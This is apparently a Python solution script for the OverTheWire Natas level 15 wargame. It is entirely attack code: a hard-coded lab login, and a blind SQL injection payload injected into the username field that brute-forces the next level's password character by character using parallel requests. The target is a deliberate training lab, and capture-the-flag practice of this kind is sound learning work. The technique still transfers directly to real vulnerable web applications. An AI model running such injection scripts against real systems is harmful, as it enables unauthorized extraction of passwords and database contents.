import requests
from concurrent.futures import ThreadPoolExecutor
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")
allword = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
ans = ""

def main(word):
    global ans
    info = ('natas16" AND password LIKE BINARY "' + ans + word + '%" #')
    req = requests.get("http://natas15.natas.labs.overthewire.org/", auth=auth, params={"username": info})
    if "This user exists." in req.text:
        ans += word
        print(ans)

for i in range(32):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(main, word) for word in allword]

    for future in futures:
        future.result()

